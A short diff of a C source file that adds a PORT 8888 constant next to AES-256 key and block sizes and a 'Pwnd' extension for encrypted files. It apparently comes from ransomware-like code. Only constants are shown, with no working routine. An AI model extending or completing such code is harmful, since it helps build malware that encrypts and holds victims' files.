@@ -7,7 +7,7 @@
 #define BUFSIZE 1024
 #define AES_256_KEY_SIZE 32
 #define AES_BLOCK_SIZE 16
-
+#define PORT 8888
 
 static const char ENCRYPT_EXT[] = "Pwnd";
 static const int EXT_LEN = strlen("Pwnd");
